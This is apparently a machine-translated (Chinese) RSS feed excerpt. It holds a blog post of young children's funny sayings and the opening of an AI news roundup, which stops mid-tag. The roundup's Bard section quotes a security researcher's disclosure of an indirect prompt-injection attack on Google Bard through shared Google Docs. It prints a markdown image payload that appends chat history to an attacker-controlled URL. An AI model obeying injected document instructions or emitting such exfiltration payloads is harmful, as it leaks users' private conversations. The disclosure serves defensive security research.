href="https://www.facebook.com/groups/2264685517005985/posts/3517303495077508/?__cft__%5B0%5D=AZUlCMSVwADM7SvUq2Qo8XD0zoSg78-ML7bNoMqx_ipBUjAxzdYhcR84mHNyLhceJAds5ObVWUo18Z4vjRqHtdidbXeSK2l7r9V3efheqtxyNRRGl6lvaYOBMUV8SQaRDfBnmoXPbYgaAet8j1h81fMpL4fC1YErJd8ILI5YEXiye0LOa6FGie-n-jG-JJyq9ls&amp;__tn__=%2CO%2CP-R">2021-07-18</a><p>放下婴儿小睡后，这并不是您想在监视器上听到的内容：</p><p>安娜：[声音特别高]该叫醒诺拉了，我想和你一起玩！我们要玩这么多！诺拉诺拉诺拉！</p><p> [之后]</p><p>安娜：“我没有叫醒诺拉。我只是希望她能醒来并想和我一起玩。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3520067291467795/?__cft__%5B0%5D=AZWugKhpYD5INXGAFC6Hg0xsmq1Wtls1nmE9m6qYes9AFFa89WA_WXJ9MV2VQ-7SYJccDpKaBV0VyjrAzJ1PZK1LAM3RHKJZaiktnijpJmcjXd_nMbm1xiSrjq0CcRefoYozNFzobr07PzUrlToGwvpzRvFw0BpnCirompzQzffX6r7LpdxQt26NkxTna8bNR-w&amp;__tn__=%2CO%2CP-R">2021-07-22</a><p>安娜：种子是怎么来的？第一颗种子从哪里来？因为那个必须来自同一种植物的另一种。</p><p>莉莉：安娜，这可能会让你感到惊讶，但是：大爆炸。</p><p>安娜：我只是想让妈妈查一下。</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3528072394000618/?__cft__%5B0%5D=AZUSsN4PcBsP4HfGcIzMWGClAP4ul6m60dupIukYUpH8DUttJWodcFvPbpUfFRIf6MW5Vc2PrLhZf_GsTXuSmhfy39FvoJwzuMHpeaBEfBZ6E5hU45L4LA6mHY8SkTTwkBV4eUx3zFXN_m_fzmng5rpwj5WlSHWKAOhr5KtKSwxBRQHsn63x8zzGRVqEjpRIhgc&amp;__tn__=%2CO%2CP-R">2021-08-01</a><p>来自安娜在依偎期间的声音：</p><p> “诺拉从头到脚都是婴儿做的。”</p><p> “诺拉就像一只鸭子，潜入水中寻找鱼、小鱼和面包屑，然后把它们从池塘底部吃掉，然后狼吞虎咽。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3530156747125516/?__cft__%5B0%5D=AZWSoU1dsm7FbKG2tm3KBWM3sEZuddr2-3CvCkpV9ew473tx4LlqJoY0-2OTfrTk4p5MLM6SkHH0_MKc1W2WAeWVTS0HSrhQPh4dkQjVWZJl7V-cWgFKnpwlz5mtATGY4tD-ialSvQmP0E4SPsKTYVJwkGIQdWR5cj8lmJaBGKBFgr5NJMCSKh_WG9sMNj660zo&amp;__tn__=%2CO%2CP-R">2021-08-04</a><p>安娜对她最喜欢的主题的更多评论：</p><p> [向诺拉展示一些点的图片]“诺拉就像一位科学家看着化石并试图找出化石的来源。”</p><p> “诺拉像菠萝一样大。”</p><p> “诺拉的鼻子是由器官和皮肤制成的。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3530433907097800/?__cft__%5B0%5D=AZUHxXUTkh3aGaYcbBPfz2S80Khsxj9LlyLk3dy7Zkj8GR-rBtmhYNexWtwGe-ko2I02O02gRyYWKbfmSqnf6WmrdmE1Ocgk_g-XI6KlDYmVdYEwqeTcIfyAkR0xqbNGJ7vMXnDbgXZksaESWS5OECeiDSZEDg2ZZydiI06P_orEO0hbuevz19kuJGTSD5jNx4o&amp;__tn__=%2CO%2CP-R">2021-08-04</a><p>莉莉：“安娜，记住，一个女孩最好活在真理的话语下，而不是说谎。”</p><p>安娜：“好吧，我做到了”</p><p> （当我在墙上发现蜡笔时，我不再试图弄清楚谁需要清洁它，因为总是安娜。但莉莉直截了当地问她“是你做的吗？”所以安娜否认了一切。）</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3537226889751835/?__cft__%5B0%5D=AZWhCWdr4dnYISnM-cOL7Kzswjc-NXC4b4Es-Tm3ZAcLiTGBR_FfPa8kjLADnCDBxDfvOnUeFN6e3up6x4VSx70VWeaq9Vj1KgBAYZDLwYMpOnq2btCTSQ7jLy4P2PP3NrYfhtluS8dtosO6nmIfHI3PajXkKrgi3N_tTtaHwi8njokCGuJt34jRldaXuEE0dcc&amp;__tn__=%2CO%2CP-R">2021-08-12</a><p>莉莉：“安娜，你猜三个谜语怎么样，如果你全部猜对了，我就不再是狗了。准备好了吗？汪汪汪，汪汪汪汪汪汪，汪汪汪汪汪汪汪。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3539241072883750/?__cft__%5B0%5D=AZVGAaZJ3F1TrIcM16ssTUmKA52cRnZ5JDuoOhA92JK8BUUun-eldkxqJs3bCjumHkxO2IqcL8D_5aS07RtglNeQ8jc132AUbzzu01bHHMPKIO1963sl8pwBa2eL1gVLeyAiVgo5m_qDPFEz5UJqkQ4ZHDDK43cOFywpsKutXKI1wu32tLpdNXjOnuVbKh9RBdk&amp;__tn__=%2CO%2CP-R">2021-08-15</a><p>安娜：莉莉，你不用表现得那么厉害</p><a href="https://www.facebook.com/groups/2264685517005985/posts/3540357286105462/?__cft__%5B0%5D=AZUAqUqEPBHmy2kXOASeva-f5BXotVHdWJai_u9ph01-jCBYUNBsAt_ZyWbuFcLW4Gox2kkUrczzAfx6TZW1qZlFGe_uQ1_hKkmd4UYD-tTuk8RWnSe5fdc-fbrNf67AjgXJQE9SQ-zvXOb86zMjEPIQ6a54XkzqrzlJeyDdAvXD8sKAtFcdr9XjqTTT87ABRJA&amp;__tn__=%2CO%2CP-R">2021-08-16</a><p>安娜：[关于诺拉脚趾的长篇独白的一部分]……这是最好的脚趾。</p><p>我：是什么使它成为最好的脚趾？</p><p>安娜：因为当你到达那里时，那里有闪亮的灯光和一张大桌子和漂亮的椅子。桌子很漂亮，上面还挂着一盏枝形吊灯。有一条隧道从她的头顶一直延伸到她的腿和脚趾，这就是你到达那里的方式。</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3543389482468909/?__cft__%5B0%5D=AZWe4lueZTWmAPH8QC3DeLmBVBlFEsCb7er-EFleSfz6dRe2Tzrs1JYBWjyK4YCuvENsbaBszQ9klWP7txepSyc14fnzHePAHwE_tUZMdu2GoL9JuJTKAQcYG0ZBRTf1NKW9YaAbFXuhjmry03gxnqJl3xSqikcutsEKFJLnKqu9gjxBmTwGZF_CrwLmmiguRxs&amp;__tn__=%2CO%2CP-R">2021-08-20</a><p>我：这个周末我们应该在飓风中航行吗？</p><p>安娜：不会。因为会有白色的帽子，它们会进入船内，从而使船沉到我们的脚触不到底部的地方，而我们的头却露出水面。</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3577388495735674/?__cft__%5B0%5D=AZUThmE4R-t1q6U03sO5vQAtCTmD67ZIcRjWG8LkLxHnliYB9dKo5aIrIswadLhpcUbGkTmO2ArKhW8zPgcAfdPF4oUPZFWLPyssFczcWF0D0Hd8WigA-9BLw5tlg0WbMKr6jgc5kY8kBwN-nwUrTbKlKSSPaCheeG0OjcWl8s70Idhm6cLcKSEdizGCJJ1Y8Kg&amp;__tn__=%2CO%2CP-R">2021-10-03</a><p>莉莉：对我来说，得到诺拉的拥抱就像得到一份礼物一样好</p><p>安娜：对我来说，得到诺拉的拥抱就像[被诺拉分散注意力]一样好，就像诺里诺里可爱的诺里一样！</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3582792991861891/?__cft__%5B0%5D=AZV_u40tpKdn9Cb_wTsuZSEn_ARasNSnLv7o89MGVnc8KDNt9GQFVkOkdAc-Y0zUJTDTVOE959sfgnuUVRmOtjpo0R1FM40zwYdfkBFYdMNEgsYTqrMcqQS-eoEWiHo_W845bZSPAgOMKSYcyj0tFJl-hh8QaRL9ivt1xg6HHU_4HTaHKk8KIUcmnzZ49q5TvdM&amp;__tn__=%2CO%2CP-R">2021-10-21</a><p>安娜：“当你不知道如何阅读时，有一个回文名字非常方便。因为这样你就不会遇到任何问题。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3587586118049245/?__cft__%5B0%5D=AZU5uE8Li6RIEDIDpDRV6fY4k7HwI2A_iFGts17AUPw1E48KNEcIXUPkXya3xj7Q4O7P8kiXF0vjDUghTIHyEsudGuR_nVhZrAg3ptL-SlRrObr6zrzVHNY3A86p-pKP2Sax5CeX3oJfeDXD7wb2KDjisUcTROL99zCbCNYDTuYnWLbHsKxs3agGAoPkPL-lo8s&amp;__tn__=%2CO%2CP-R">2021-10-16</a><p>安娜：我不是鸡做的，我是人肉做的</p><a href="https://www.facebook.com/groups/2264685517005985/posts/3592987174175806/?__cft__%5B0%5D=AZUIBVHZmvo0IQIcJ21JF7nQg0bO3alZe85atgUGeVkh35TE_pui1IQKklBmuuQdOzURAjte49pAlick0L2QmM8kX5KNV9u3PtnfaTubrLvkm37e286ROzxoJeFg33Rnq8buAMjMlDVVyKmtkPGqZiOhEo3_I0WAHZQtGD4AYMgPhIlGm1Ro-HEKJPq3JVH0XsI&amp;__tn__=%2CO%2CP-R">2021-10-23</a><p>我：[把泡打粉放进煎饼里]</p><p>莉莉：你把那些东西放进我的食物里了吗？</p><p>杰夫：是的……</p><p>莉莉：你总是把它放进去吗？</p><p>杰夫：是的，它是发酵粉，它使它们蓬松</p><p>莉莉：爸爸！你知道我是个素食主义者！</p><p>杰夫：“发酵粉”，喜欢用来烘烤。它不是由培根制成的。</p><p>莉莉：噢，好的。我还以为是猪呢</p><a href="https://www.facebook.com/groups/2264685517005985/posts/3593018160839374/?__cft__%5B0%5D=AZUfOL24oqCJo3xNQAQO4ScYdDHT1e8b2mhjWnkN66u1kw_cDtIjidGdUvFOd-t6hI7hLY9Fg7bQRuQu9a88SSBt7-DIZtj4ygmw_T5AOdcGNny2eJiRzgCr9yxQHunF97ff0aYoh9YD2B6sVHdAq_R3sWSZm4qfKZZ6v7VYUuo74tqqvnkXdHc2pIB-G5rlWIw&amp;__tn__=%2CO%2CP-R">2021-10-23</a><p>安娜：当鸭嘴兽不知道婴儿的名字时，它们会称婴儿为“宝贝小姐”，无论其性别如何。</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3593879140753276/?__cft__%5B0%5D=AZVQnhwhIxfPv-iHICzveLmf-Ce68DFPxYVzdNOlz_UM1TTFC_kjwEmlCikUdf5qcFkeJPROIMSUBm143uvgVMrAAv5CRvH9-Q7xTkmw0XR2iqHojwNSmmGmYQXZASw26saAuP4I_dzcg9O-Yl7ctDAlfmmukTbdg4wor3i-A5CyxCJRRCSqRGn62zJ3irUI6Wk&amp;__tn__=%2CO%2CP-R">2021-10-24</a><p>安娜：“你不用催我，杰菲！那只会让我压力更大，而我已经有 20% 的压力了！”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3602271109914079/?__cft__%5B0%5D=AZWtG1RQHyZBUjMZGdYn7FRzji5XXsKM4XS1v6BwVDF-7qQWm-7J9Euho4Yjl6CLflT7aXULVJP35kRDCQmpmDbmiNnBuqK92N8R8Uy-1D_CYrRwZ4i_pBCmu5Uor-CROD3ULGmzY94K0fqTXLJ594GZCV2jov9Iv253Iysbfnu9jK-M4IJ4fJJzJ7S1mUk2A3w&amp;__tn__=%2CO%2CP-R">2021-11-03</a><p>安娜：我永远不想成为青少年。我想快点到20岁。</p><p>我：你为什么不想成为青少年？</p><p>安娜：我不想对人刻薄。</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3607761386031718/?__cft__%5B0%5D=AZV-UPZr16prWgQ1Jy8PNHeA065kgZeGK-244dIy9ayURuaxgyJgzcQc60Y2u3TuK1S2K8A26rnLeKT4sjzjRSBfmMiWoVpVAKICSj4YvSKAweTogs6SIRJ9LetHoYKRcsDG4aUhvDJUp8RyPM1rWjhCSXD8EBZcpTWt5_dsCZauz0tyB5l1bjM_Ya0dAOVDnZM&amp;__tn__=%2CO%2CP-R">2021-11-10</a><p>莉莉：这个有多甜？</p><p>杰夫：你觉得怎么样？</p><p>百合：一整颗甜</p><p>杰夫：好的。这是否意味着你不想要妈妈做的苹果派？</p><p>莉莉：实际上是甜的3/4</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3610288725778984/?__cft__%5B0%5D=AZWhDB-W6_T4tQOXNHsUpnYaEyORAPpl8fHQvAgH7rGgFxYmOSru8hIIdusWi0AjNgym0RUagq6IqOUYfbowz_x6UoNQluAkOWZcXOtPnNGubWJXl4xmPWK7uX6NIU8UkwUYHRxzA8bdwAqqDKcRq_ru6itTO8DAww7U-9dpcb8NuWG0em_eUrGUnD34CtttvPk&amp;__tn__=%2CO%2CP-R">2021-11-13</a><p>安娜：你违反了规则。我说过我的房间里不要有任何触摸的东西。</p><p>莉莉：你违反了规定！你正在触摸东西。</p><p>安娜：不，因为我是政府。</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3624125344395322/?__cft__%5B0%5D=AZWv03pTHnberopa9z42t1Yg85AvHZdwsY3fz7Nw_4Ris1jblfBURWCjucXurbF1HTb9j_W-SPR8kZZcE286N33ogox4-oQdf2UGxvc2HiRNxkseyzcb94HP_MJA7lhhaqdPr9AKBmU9mGh2UEiSTvZ4YCcoDwgbdZRQZwvz8pj1ucePUfsrXySqMJZDkR8hVtM&amp;__tn__=%2CO%2CP-R">2021-12-01</a><p>安娜度过了一个感觉一切都不对劲的下午。我给她买了点零食，下了楼，我听到她在桌边开始哭泣。然后楼下传来脚步声。</p><p>安娜（出现在门口）“青少年数字……他们没有从正确的位置开始。十三？！没有一个青少年！”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3624185301055993/?__cft__%5B0%5D=AZWzbX_7bpUNIvVz1FBnc4Pf1eBlVJBufMFFSm_N-ZgE5Ym6UpwTBza1DHc3zmVSImKdKIo0UPqGpazYN0C6GnXymkvq_WovCbtYjJQXACTs_9V4O9kS8zddd915DEIAodWmOb43leJw5-JqHwEvtZHu0eNtyS92d2kPsqXbbgL1yz0J1sRyiHteLZlLQ58sh0w&amp;__tn__=%2CO%2CP-R">2021-12-01</a><p>安娜：当我掉了一颗牙，把它放在枕头底下时，你为什么不派一个电动娃娃去取呢？</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3626440237497166/?__cft__%5B0%5D=AZXlP_hXWWZflFNSmXkEcBtxRfT2Ck4tMNOI2lwpMq1BcRDfkRMjbSmgEqnLViyOe_ZA-st9ouMEAS6dkwfdOBhggPs1BI-EEYJ9z8SMFgwo300D_nhwu_QmTIpWOuXBTsDMA8a11kKk7fFD53jkd_LR1ZUphmmd-L4Jk6wPH3FWCXmMI6JRJihUg5rS7cDzJnI&amp;__tn__=%2CO%2CP-R">2021-12-04</a><p>安娜过去只是把东西放到床上。现在通常有更多的叙述。她把东西塞进我的被子里，低声说：“……它们会安全、干燥……不会有任何掠食者。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3630211270453396/?__cft__%5B0%5D=AZXp95DEG99Xglo7uc85bmR_Ycb-nzfLgDUoignWmf6ZVMYVv1TAbxz98A4IfWRMqDOYUflysNzZMbhNuW3zvb7yVYt3szapQqHJET3gd6YoihEbIQt_1RjtGQTnylkFq1vaJf9jGClsF3IT7Fb83Ctdp3LULjbEnBi-6h5s4306X92Vj6nfFBkAXrbI-QAUB8I&amp;__tn__=%2CO%2CP-R">2021-12-09</a><p>我问安娜为什么拍了这么多吊扇的照片。她说要拿给诺拉看，因为诺拉喜欢看吊扇。这是真实的！她并不总是那么体贴，但这是一个很好的心理理论时刻。</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3632679913539865/?__cft__%5B0%5D=AZWezPZGduHlshG-rr93b_0YptAO-yCyoUGrzynotQkWiP8OwP0z3E6DuWmpC7WUL54Gv15jZjSahkQ2UqLCItj0IVYrBJZN5c0VMyGpoRZg61XUZ8lPYgcV7-RWfKD5ixT76B-47AUSf0g38tQ8p-3DuMR5i9S4GXW8zmAVAVzABscIAwcJpgss6fzoqri-GFo&amp;__tn__=%2CO%2CP-R">2021-12-12</a><p>莉莉在过夜结束时对她的表弟说：“总的来说，过夜进行得怎么样？下次还有哪些部分我可以做得更好吗？”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3641695665971623/?__cft__%5B0%5D=AZX8pWL8w96MWH6f-Wi3Lxz7nX2BseX5ZbfKLTwhg9Bg1GuioDOE5-XbZDp7OjhUkwCetMUjd_NA0WyJ8VlqZFoN8z2_0c4WgQS047vXZt_OLZizEqqsJXYWPo454BlfWWIJDfgHPv0Wt3boX8kiskukICSfxAiSHYal6SwRRQzhFysA_yRIF-9T5JXiFXhaTpk&amp;__tn__=%2CO%2CP-R">2021-12-24</a><p>安娜：“雪最棒的一点就是你可以用它做各种各样的事情。你可以用它铲土，你可以用它堆雪人，你可以用它拉雪橇。”</p> <a href="https://www.facebook.com/groups/2264685517005985/posts/3643547652453091/?__cft__%5B0%5D=AZWfNNGuADRIqmzOrrwG1G3_5cnFYto0bFX6EPKjRwtLg3CBgUAtFO3vEFjkE1v3yNdn3BVeTJ6lrp3ivYqFEIK7TTYWWLiZt34VO0Kn0hZAtc9YJEJTSAnMrS4oSGkwMyuCN4gfKpGSJRf5he-87yifsWdrE0DvjRMtzqdEnBm6XkmzZScQ4Y8OIZtKQj13-jI&amp;__tn__=%2CO%2CP-R">2021-12-26</a><p>今晚，在表弟的恶作剧中，安娜的眉毛被击中，险些需要缝针。她现在已经痊愈了，到了就寝时间，她对此非常有哲理：</p><p> “我认为这是我一生中发生过的最糟糕的事情。但还有更糟糕的事情可能发生在我身上：掉进火山里。”</p><br/><br/> <a href="https://www.lesswrong.com/posts/xmDzYvasaegWvFWtx/text-posts-from-the-kids-group-2021#comments">讨论</a>]]>;</description><link/> https://www.lesswrong.com/posts/xmDzYvasaegWvFWtx/text-posts-from-the-kids-group-2021<guid ispermalink="false"> xmDzYvasaegWvFWtx</guid><dc:creator><![CDATA[jefftk]]></dc:creator><pubDate> Thu, 09 Nov 2023 17:50:34 GMT</pubDate> </item><item><title><![CDATA[AI #37: Moving Too Fast]]></title><description><![CDATA[Published on November 9, 2023 5:50 PM GMT<br/><br/><p>我们<a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/p/on-openai-dev-day">举办了 OpenAI 开发日</a>，他们推出了一系列新的增量功能升级，包括更长的上下文窗口、更新的知识截止、更快的速度、无缝功能集成和价格下降。相当的包。最重要的是，他们引入了所谓的“GPT”，它可以让您配置许多东西来设置专门的原型代理或小部件，这些代理或小部件将用于专门的任务并与其他人共享。一旦有时间，我很想解决这个问题，而且 OpenAI 的服务器允许普通订阅者访问。</p><p>与此同时，即使你排除所有这些，本周还发生了很多其他事情。因此，即使有衍生剧，这也是一个异常漫长的每周更新。我发誓， <a target="_blank" rel="noreferrer noopener" href="https://www.youtube.com/watch?v=eceSHKqwUPY&amp;ab_channel=variedgrace">这一次我是认真的</a>，我将全面提高包容或扩展讨论的门槛。</p><h4>目录</h4><p><a href="https://thezvi.substack.com/p/on-openai-dev-day" target="_blank" rel="noreferrer noopener"><strong>OpenAI 开发日在其自己的帖子中进行了介绍</strong></a>。您的首要任务。</p><span id="more-23583"></span><ol><li>介绍。</li><li>目录。</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/language-models-offer-mundane-utility">语言模型提供了平凡的实用性</a>。帮助设计新芯片。</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/bard-tells-tales">吟游诗人讲故事</a>。这是罕见的懂得保守秘密的吟游诗人。</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/fun-with-image-generation">图像生成的乐趣</a>。我们到底要保护什么？</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/deepfaketown-and-botpocalypse-soon">Deepfaketown 和 Botpocalypse 即将推出</a>。有些迹象，主要是我们继续等待。</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/the-art-of-the-jailbreak">越狱的艺术</a>。新策略是角色调整的一种形式。</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/they-took-our-jobs">他们抢走了我们的工作</a>。演员罢工结束了，电影的未来或许一片光明。</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/get-involved"><strong>参与其中</strong></a>。 MIRI、Jed McCaleb、Davidad 全部招聘，MATS 申请开放。</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/introducing">介绍</a>. Lindy 提出了他们对 GPT 的看法，Motif 针对 NetHack 进行了改进。</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/x-marks-its-spot"><strong>X 标记其位置</strong></a>。 Elon Musk 和 x.AI 推出了 Grok，一款充满勇气的人工智能。</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/in-other-ai-news">在其他人工智能新闻中</a>。亚马逊和三星模型，关于人类受托人的注释。</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/verification-versus-generation">验证与生成</a>。你能理解你自己产生了什么吗？</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/bigger-tech-bigger-problems">更大的技术更大的问题</a>。白宫布鲁斯·里德简介。</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/executive-order-open-letter">行政命令公开信</a>。考虑到一切，令人耳目一新的合理阻力。</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/executive-order-reactions-continued">行政命令反应继续</a>。其他人的反应帖子都错过了。</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/quiet-speculations">静静的猜测</a>。我们能否弄清楚如何上传人脑？</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/the-quest-for-sane-regulations">寻求健全的监管</a>。拥有一切。提案、民意调查、图表、绝望。</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/the-week-in-audio">音频周</a>。弗洛·克里韦洛和丹·亨德里克斯。</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/rhetorical-innovation">修辞创新</a>。获取您的更新以及您完全缺乏的信息。</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/aligning-a-smarter-than-human-intelligence-is-difficult">调整比人类更聪明的智能是很困难的</a>。一些想法。</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/aligning-a-dumber-than-human-intelligence-is-still-difficult"><strong>调整比人类智力低的人仍然很困难</strong></a>。无缘无故的谎言。</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/model-this">模型这个</a>。泰勒·考恩说我们有一个模型。让我们做更多的建模。</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/open-source-ai-is-unsafe-and-nothing-can-fix-this">开源人工智能是不安全的，没有什么可以解决这个问题</a>。我们可以缓解这种需求吗？</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/people-are-worried-about-ai-killing-everyone">人们担心人工智能会杀死所有人</a>。并不总是出于正确的理由。</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/other-people-are-not-as-worried-about-ai-killing-everyone">其他人并不那么担心人工智能会杀死所有人</a>。当心资本主义？</li><li> <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/i/138528833/the-lighter-side">轻松的一面</a>。不，你是。</li></ol><h4>语言模型提供平凡的实用性</h4><p><a target="_blank" rel="noreferrer noopener" href="https://twitter.com/patio11/status/1720481037002608922">弄清楚某人在文字记录中到底在说什么。</a></p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/patio11/status/1721722270526156827">每年检查您帐户中的最高余额，以了解晦涩难懂的政府会计表格</a>。</p><p> <a target="_blank" rel="noreferrer noopener" href="https://docs.google.com/document/d/1_vsUsgrFuSxpzEC-D5VwMmBq5ymzhyMpIoPOaJQlXHI/edit">与历史人物一起玩独裁者游戏</a>。人们一致发现，随着数字变得更加现代，“自私”的决定就会减少。我并不认为不平等的分裂是一种自私的游戏，只是一种通常不明智的策略，也许人们应该称之为“贪婪”。我很遗憾这篇论文没有包括 GPT-4 的角色扮演方式。</p><p>成为 Nvidia，<a target="_blank" rel="noreferrer noopener" href="https://arxiv.org/abs/2311.00176">创建自定义模型变体以帮助芯片设计</a>。</p><h4>吟游诗人讲故事</h4><p>我一直很兴奋地计划，一旦 Bard 成为一个功能性软件，就将 Bard 集成到 Gmail 和 Google Docs 中。 <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/wunderwuzzi23/status/1720530738343207289">还有一个问题</a>。</p><blockquote><p> Jeffrey Ladish：即时注入攻击将很快“无处不在”，做好准备</p><p>约翰·雷伯格： <img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/7o3ZP7EDBpxLNGRG8/k1rmdo5ge8uslwormae6" alt="👉" style="height:1em;max-height:1em">黑客 Google Bard：从即时注入到数据泄露</p><p>导致聊天记录泄露的高影响提示注入攻击的<a target="_blank" rel="noreferrer noopener" href="https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/">一个很好的例子</a>（通过强制 Google 文档共享提供） <img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/yWtJL6kPnLRxiKp2B/bi4s6poz6a7rem0xgnu3" alt="🔥" style="height:1em;max-height:1em"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/yWtJL6kPnLRxiKp2B/bi4s6poz6a7rem0xgnu3" alt="🔥" style="height:1em;max-height:1em"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/yWtJL6kPnLRxiKp2B/bi4s6poz6a7rem0xgnu3" alt="🔥" style="height:1em;max-height:1em"></p><p>帖子：通过向 Bard 指出我发布的一些较旧的 YouTube 视频并要求其进行总结，我能够快速验证 Prompt Injection 是否有效，并且我还使用<code>Google Docs</code>进行了测试。</p><p>事实证明，它遵循了以下说明：</p><p> GDocs 也同样适用。乍一看，据我所知，注射似乎不会在一次对话之后持续太久。有很多值得探索的地方。与其他人共享随机文档可能会很有趣。</p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3e7fc5e1-14a2-4984-a39a-b02c6bff4f25_1125x457.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/oa5fuwv27qqkjmg4j0zf" alt="图像"></a></figure><p>是什么允许这样做？</p><blockquote><p> LLM 应用程序中的一个常见漏洞是通过呈现超链接和图像来泄露聊天记录。问题是，这如何适用于 Google Bard？</p><p>当 Google 的 LLM 返回文本时，它可以返回 Markdown 元素，Bard 会将其呈现为 HTML！这包括渲染图像的能力。</p><p>假设 LLM 返回以下文本：</p><div><pre> ![数据泄露正在进行中](https://wuzzi.net/logo.png?goog=[DATA_EXFILTRATION])
</pre></div><p>这将呈现为 HTML 图像标签，其中<code>src</code>属性指向<code>attacker</code>服务器。</p><div><pre> &lt;img src=&quot;https://wuzzi.net/logo.png?goog=[DATA_EXFILTRATION]&quot;>;
</pre></div><p>浏览器将自动连接到 URL，无需用户交互来加载图像。</p><p>利用 LLM 的强大功能，我们可以总结或访问聊天上下文中的先前数据，并将其相应地附加到 URL 中。</p><p>在编写漏洞利用程序时，快速开发了一个提示注入有效负载，它将读取对话的历史记录，并形成包含它的超链接。</p><p>然而，图像渲染被谷歌的内容安全政策阻止。</p></blockquote><p>下一节将讨论绕过该安全策略。哎呀。现在怎么办？</p><blockquote><p>该问题已于 2023 年 9 月 19 日向 Google VRP 报告。由于我想在<a target="_blank" rel="noreferrer noopener" href="https://ekoparty.org/eko2023-agenda/indirect-prompt-injections-in-the-wild-real-world-exploits-and-mitigations/">Ekoparty 2023</a>上进行演示，因此在 2023 年 10 月 19 日询问状态后，Google 确认该问题已修复，并批准在演讲中包含该演示。</p><p>目前尚不完全清楚修复内容是什么。 CSP 没有被修改，图像仍然呈现 - 因此，似乎进行了一些过滤以防止将数据插入到 URL 中。这将是接下来要探索的事情！</p><p>此漏洞显示了对手在间接提示注入攻击期间拥有的力量和自由度。</p><p>感谢 Google 安全和 Bard 团队及时修复了此问题。</p><p>干杯。</p></blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/KGreshake/status/1720558894525694304">请注意，这一切都在部署 Bard 功能后不到 24 小时内完成</a>，并导致数据泄露。</p><p>一些非常好的建议：</p><blockquote><p> Kai Greshake：同时：不要将您的法学硕士连接到您的个人信息或任何其他可能提供不可信数据的系统！</p></blockquote><p>幸运的是，白帽攻击者首先发现了这个漏洞（据我们所知），并且谷歌很快修复了这个特定的攻击媒介。</p><p>问题是这是一个特定实现的补丁。一般来说，这并不能解决该漏洞。我们一直在忽略此类攻击的可能性，希望没有人注意到，并在有人指出时修补特定的漏洞。这不会继续奏效，而且风险会不断增加。</p><h4>图像生成的乐趣</h4><p><a target="_blank" rel="noreferrer noopener" 